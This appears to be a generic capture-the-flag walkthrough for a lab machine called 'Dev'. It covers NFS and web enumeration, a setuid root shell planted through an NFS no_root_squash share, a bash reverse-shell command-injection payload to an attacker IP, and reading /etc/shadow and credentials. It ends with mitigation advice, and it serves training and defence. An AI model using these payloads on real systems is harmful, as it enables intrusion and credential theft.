# Dev Walkthrough

## Overview
The "Dev" machine simulates a development environment with misconfigured services and vulnerable applications. This walkthrough covers the process of identifying vulnerabilities, gaining initial access, and escalating privileges on the system.

## Reconnaissance and Enumeration

### Initial Nmap Scan
```bash
nmap -sV -sC -p- --min-rate 5000 <target_ip>
```

**Key findings:**
- Port 22: SSH
- Port 80: HTTP (Apache)
- Port 111: RPC
- Port 2049: NFS
- Port 8080: HTTP (development server)
- Linux-based target

### NFS Enumeration

1. **List NFS shares**:
   ```bash
   showmount -e <target_ip>
   ```

   **Key findings:**
   - `/home/dev` exported and available for mounting

2. **Mount the NFS share**:
   ```bash
   mkdir /tmp/nfs
   mount -t nfs <target_ip>:/home/dev /tmp/nfs
   ```

3. **Explore mounted share**:
   ```bash
   ls -la /tmp/nfs
   ```

### Web Application Enumeration

1. **Main website (Port 80)**:
   - Check for visible pages and functions
   - View source code for comments or hidden info
   - Run directory enumeration:
     ```bash
     gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
     ```

2. **Development server (Port 8080)**:
   - Examine applications running on this port
   - Look for development features or debugging info
   - Check for API endpoints

## Vulnerability Analysis

### NFS Misconfigurations

1. **Check for `no_root_squash` option**:
   - This misconfiguration allows local root to have remote root access

2. **Examine file permissions on NFS share**:
   - Look for sensitive files, configuration backups, or credentials

### Web Application Vulnerabilities

1. **Check for common vulnerabilities**:
   - SQL injection
   - Path traversal/LFI
   - Command injection
   - Insecure file uploads

2. **Check for development artifacts**:
   - Git repositories (.git folders)
   - Backup files (.bak, .old, etc.)
   - Configuration files

## Initial Exploitation

### Method 1: Exploiting NFS Misconfiguration

1. **Create a setuid binary for privilege escalation**:
   ```bash
   # On Kali
   mkdir -p /tmp/nfs
   mount -t nfs <target_ip>:/home/dev /tmp/nfs
   
   cat > /tmp/nfs/shell.c << EOF
   #include <stdio.h>
   #include <sys/types.h>
   #include <unistd.h>
   int main(void) {
     setuid(0); setgid(0);
     system("/bin/bash");
     return 0;
   }
   EOF
   
   gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
   chmod u+s /tmp/nfs/shell
   ```

2. **Connect via SSH and execute the binary**:
   - Find credentials in the NFS share or web application
   - SSH to the target
   - Run the setuid binary

### Method 2: Exploiting Web Vulnerabilities

1. **Identify vulnerable parameters in web applications**
2. **Look for command injection opportunities**:
   - Test parameters that might execute system commands
   - Try payloads like `; id`, `| id`, etc.

3. **Gain reverse shell**:
   - Set up a netcat listener: `nc -lvnp 4444`
   - Send payload: `; bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`

## Privilege Escalation

### Basic Enumeration

1. **Check current user privileges**:
   ```bash
   id
   sudo -l
   ```

2. **Automated enumeration**:
   ```bash
   # Download LinPEAS
   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

### Privilege Escalation Vectors

1. **Check for development tools with elevated permissions**:
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Look for insecure sudo configurations**:
   ```bash
   sudo -l
   ```

3. **Check for writeable cron jobs**:
   ```bash
   cat /etc/crontab
   ls -la /etc/cron*
   ```

4. **Check for insecure file permissions**:
   ```bash
   find / -writable -type f 2>/dev/null
   ```

5. **Look for custom scripts or applications**:
   - Development environments often have custom tools with vulnerabilities

### Root Access

1. **Exploit identified privilege escalation vector**:
   - Based on findings, implement appropriate technique
   - Examples:
     - Exploiting SUID binary
     - Abusing sudo permissions
     - Exploiting a development tool/script

2. **Verify root access**:
   ```bash
   id
   whoami
   ```

## Capturing Flags

1. **User flag**:
   ```bash
   find / -name user.txt 2>/dev/null
   cat /home/<username>/user.txt
   ```

2. **Root flag**:
   ```bash
   find / -name root.txt 2>/dev/null
   cat /root/root.txt
   ```

## Post-Exploitation

1. **Gather sensitive information**:
   ```bash
   cat /etc/shadow
   ls -la /home/*/
   ```

2. **Check for development credentials**:
   ```bash
   grep -r "password" /var/www/
   grep -r "DB_PASS" /var/www/
   ```

3. **Examine source code repositories**:
   ```bash
   find / -name ".git" 2>/dev/null
   ```

## Mitigation Recommendations

If this were a real engagement, recommend:

1. **Secure NFS Configuration**: Remove `no_root_squash` option and restrict NFS exports
2. **Implement Proper Authentication**: Ensure all services require authentication
3. **Principle of Least Privilege**: Minimize privileges for development accounts
4. **Secure Development Practices**: Follow secure coding guidelines
5. **Segregate Development Environments**: Isolate development servers from production
6. **Regular Audits**: Conduct regular security reviews of development environments
7. **Configuration Management**: Use secure, version-controlled configurations

## Lessons Learned

- Development environments often prioritize functionality over security
- NFS misconfigurations can lead to privilege escalation
- Development servers may contain valuable credentials or source code
- Custom applications in development may lack security controls
- Proper network segmentation is essential for development environments
